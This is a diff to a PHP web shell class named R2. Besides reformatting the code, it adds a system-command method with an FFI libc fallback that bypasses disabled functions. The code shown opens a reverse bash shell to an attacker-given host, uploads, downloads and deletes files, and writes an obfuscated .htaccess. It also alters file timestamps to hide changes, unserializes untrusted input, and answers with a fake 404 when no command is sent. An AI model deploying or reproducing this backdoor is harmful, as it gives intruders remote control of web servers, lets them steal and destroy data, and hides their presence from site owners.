@@ -15,6 +15,10 @@
 
  */
 
+/** {{{ Main class
+ * Class: R2
+ *
+ */
 class R2
 {
     public static int $chunk_size = 1400;
@@ -23,10 +27,11 @@ class R2
     public static int $daemon = 0;
     public static string $shell = 'bash -i'; // bash
     public static string $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
-    /*
-     * @param string $host attacker ip/host
-     * @param int $port attacker port
-     * @return none
+    /** {{{ Constructor
+     * __construct
+     *
+     * @param bool $debug
+     * @param int $time
      */
     public function __construct(bool $debug = true, int $time = 0)
     {
@@ -41,14 +46,26 @@ class R2
         $this->cwd = getcwd() . DIRECTORY_SEPARATOR;
         $this->cft = time();
     }
+    /* }}} */
+    /** {{{ Reverse shell
+     * reverse
+     *
+     * @param string $host
+     * @param int $port
+     */
     public function reverse(string $host, int $port)
     {
         if (function_exists('pcntl_fork')) {
             $pid = pcntl_fork();
-            if ($pid == -1) exit(1);
-            elseif ($pid) exit(0); // Parent exits
+            if ($pid == -1) {
+                exit(1);
+            } elseif ($pid) {
+                exit(0);
+            } // Parent exits
             // Will only succeed if we forked
-            if (posix_setsid() == -1) exit(1);
+            if (posix_setsid() == -1) {
+                exit(1);
+            }
             R2::$daemon = 1;
         }
         // Remove any umask we inherited
@@ -56,7 +73,9 @@ class R2
 
         // Open reverse connection
         $sock = fsockopen($host, $port, $errno, $errstr, 30);
-        if (!$sock) exit(1);
+        if (!$sock) {
+            exit(1);
+        }
         // Spawn shell process
         $descriptorspec = array(
             0 => array('pipe', 'r'), // stdin
@@ -66,16 +85,22 @@ class R2
 
         $process = proc_open(R2::$shell, $descriptorspec, $pipes);
 
-        if (!is_resource($process)) exit(1);
+        if (!is_resource($process)) {
+            exit(1);
+        }
         stream_set_blocking($pipes[0], 0);
         stream_set_blocking($pipes[1], 0);
         stream_set_blocking($pipes[2], 0);
         stream_set_blocking($sock, 0);
         while (1) {
             // Check for end of TCP connection
-            if (feof($sock)) break;
+            if (feof($sock)) {
+                break;
+            }
             // Check for end of STDOUT
-            if (feof($pipes[1])) break;
+            if (feof($pipes[1])) {
+                break;
+            }
 
             $read_a = array($sock, $pipes[1], $pipes[2]);
             $num_changed_sockets = stream_select(
@@ -107,29 +132,34 @@ class R2
         fclose($pipes[2]);
         proc_close($process);
     }
-    /*
-     * @param array $file from $_FILES
-     * @return bool
+    /* }}} */
+    /** {{{ Upload files from client to server
+     * upload
+     *
+     * @param array $file
      */
-    public function upLoad(array $file)
+    public function upload(array $file)
     {
         return move_uploaded_file(
             $file['tmp_name'],
             $this->cwd . $file['name']
         );
     }
-    /*
-     * @param none
-     * @return bool
+    /* }}} */
+    /** {{{ Remove given files
+     * remove
+     *
      */
     public function remove()
     {
         return unlink($_SERVER['SCRIPT_FILENAME']);
     }
-    /*
-     * @param string $name output file name
-     * @param string $file mix encoded source
-     * @return bool
+    /* }}} */
+    /** {{{ Write string to files
+     * write
+     *
+     * @param string $name
+     * @param string $file
      */
     public function write(string $name, string $file)
     {
@@ -144,17 +174,20 @@ class R2
             return touch($this->cwd . DIRECTORY_SEPARATOR, $this->cft);
         }
     }
-    /*
-     * @param none
-     * @return bool
+    /* }}} */
+    /** {{{ Write htaccess
+     * htaccess
+     *
      */
     public function htaccess()
     {
         return $this->write('.htaccess', R2::$htaccess);
     }
-    /*
-     * @param string $class class to be reflected
-     * @return json
+    /* }}} */
+    /** {{{ Print help
+     * help
+     *
+     * @param string $class
      */
     public function help(string $class)
     {
@@ -167,20 +200,23 @@ class R2
             JSON_PRETTY_PRINT
         );
     }
-    /*
-     * @param string $class class to be reflected
-     * @param string $property property to be reflected
-     * @param string $value value to be replaced
-     * @return none
+    /* }}} */
+    /** {{{ Able to modif php class itself
+     * debug
+     *
+     * @param string $class
+     * @param string $property
+     * @param string $value
      */
     public function debug(string $class, string $property, string $value)
     {
         $ref = new ReflectionClass($class);
         $ref->setStaticPropertyValue($property, $value);
     }
-    /*
-     * @param none
-     * @return json
+    /* }}} */
+    /** {{{ General PHP info
+     * info
+     *
      */
     public function info()
     {
@@ -221,11 +257,13 @@ class R2
         }
         return json_encode($r, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
     }
-    /*
-     * @param string $file path to filename
-     * @return mixed
+    /* }}} */
+    /** {{{ Download files from server to client
+     * download
+     *
+     * @param string $file
      */
-    public function downLoad(string $file)
+    public function download(string $file)
     {
         $file = $this->cwd . $file;
         header("Content-Disposition: attachment; filename=" . basename($file));
@@ -233,9 +271,11 @@ class R2
         header("Content-Type: application/octet-stream;");
         readfile($file);
     }
-    /*
-     * @param string $ls path to listed
-     * @return json
+    /* }}} */
+    /** {{{ List directory
+     * ls
+     *
+     * @param mixed $dir
      */
     public function ls($dir)
     {
@@ -244,9 +284,11 @@ class R2
             JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES
         );
     }
-    /*
-     * @param string $file file path to be removed
-     * @return bool
+    /* }}} */
+    /** {{{ Remove given files
+     * rm
+     *
+     * @param string $file
      */
     public function rm(string $file)
     {
@@ -256,19 +298,46 @@ class R2
             return unlink($this->cwd . DIRECTORY_SEPARATOR . $file) . PHP_EOL;
         }
     }
+    /* }}} */
+    /** {{{ Serialize given string
+     * serial
+     *
+     * @param string $data
+     */
     public function serial(string $data)
     {
         return unserialize($data) . PHP_EOL;
     }
+    /* }}} */
+    /** {{{ Change directory
+     * cd
+     *
+     * @param string $directory
+     */
     public function cd(string $directory)
     {
         $this->cwd = $this->cwd . $directory;
         chdir($this->cwd);
     }
+    /* }}} */
+    /** {{{ Change file times
+     * changeTime
+     *
+     * @param mixed $file
+     */
     public function changeTime($file)
     {
-        if (file_exists($file)) $this->cft = filemtime($file);
+        if (file_exists($file)) {
+            $this->cft = filemtime($file);
+        }
     }
+    /* }}} */
+    /** {{{ Arhive given files to zip
+     * zip
+     *
+     * @param string $filename
+     * @param mixed $file
+     */
     public function zip(string $filename, $file)
     {
         $zip = new ZipArchive();
@@ -292,6 +361,13 @@ class R2
 
         $zip->close();
     }
+    /* }}} */
+    /** {{{ unzip given files
+     * unzip
+     *
+     * @param mixed $filename
+     * @param mixed $to
+     */
     public function unzip($filename, $to)
     {
         $zip = new ZipArchive();
@@ -304,7 +380,31 @@ class R2
         }
         $zip->close();
     }
+    /* }}} */
+    /** {{{ Call system command
+     * cmd
+     *
+     * @param string $command
+     */
+    public function cmd(string $command)
+    {
+        if (function_exists(system::class)) {
+            system($command);
+        } elseif (class_exists(FFI::class)) {
+            $clib = 'libc.so';
+            $ccode = <<<'CDEF'
+int system(char const *cmd);
+CDEF;
+            $libc = FFI::cdef($ccode, $clib);
+            $libc->system($command);
+        }
+    }
+    /* }}} */
 }
+/* }}} */
+/** {{{ MAIN
+ */
+
 $r2 = new R2(true, 0);
 
 if (isset($_POST['debug'])
@@ -312,28 +412,37 @@ if (isset($_POST['debug'])
     && isset($_POST['value'])) {
     echo $r2->debug($_POST['debug'], $_POST['property'], $_POST['value']);
 }
-if (isset($_POST['cd'])) $r2->cd($_POST['cd']);
+if (isset($_POST['cd'])) {
+    $r2->cd($_POST['cd']);
+}
 if (isset($_POST['host']) && isset($_POST['port'])) {
     $r2->reverse($_POST['host'], $_POST['port']);
-} elseif (isset($_FILES['upload'])) echo $r2->upLoad($_FILES['upload']);
-elseif (isset($_POST['remove'])) echo $r2->remove();
-elseif (isset($_POST['htaccess'])) echo $r2->htaccess();
-elseif (isset($_POST['name']) && isset($_POST['write'])) {
+} elseif (isset($_FILES['upload'])) {
+    echo $r2->upLoad($_FILES['upload']);
+} elseif (isset($_POST['remove'])) {
+    echo $r2->remove();
+} elseif (isset($_POST['htaccess'])) {
+    echo $r2->htaccess();
+} elseif (isset($_POST['name']) && isset($_POST['write'])) {
     echo $r2->write($_POST['name'], $_POST['write']);
-}
-elseif (isset($_POST['help'])) echo $r2->help($_POST['help']);
-elseif (isset($_POST['info'])) echo $r2->info();
-elseif (isset($_POST['download'])) $r2->downLoad($_POST['download']);
-elseif (isset($_POST['ls'])) echo $r2->ls($_POST['ls']);
-elseif (isset($_POST['rm'])) echo $r2->rm($_POST['rm']);
-elseif (isset($_POST['serial'])) echo $r2->serial($_POST['serial']);
-elseif (isset($_POST['zip']) && isset($_POST['file'])) {
+} elseif (isset($_POST['help'])) {
+    echo $r2->help($_POST['help']);
+} elseif (isset($_POST['info'])) {
+    echo $r2->info();
+} elseif (isset($_POST['download'])) {
+    $r2->downLoad($_POST['download']);
+} elseif (isset($_POST['ls'])) {
+    echo $r2->ls($_POST['ls']);
+} elseif (isset($_POST['rm'])) {
+    echo $r2->rm($_POST['rm']);
+} elseif (isset($_POST['serial'])) {
+    echo $r2->serial($_POST['serial']);
+} elseif (isset($_POST['zip']) && isset($_POST['file'])) {
     $r2->zip($_POST['zip'], $_POST['file']);
-}
-elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
+} elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
     $r2->unzip($_POST['unzip'], $_POST['to']);
-}
-else {
+} else {
     header('HTTP/1.0 404 Not Found', true, 404);
     exit(404);
 }
+/* }}}*/
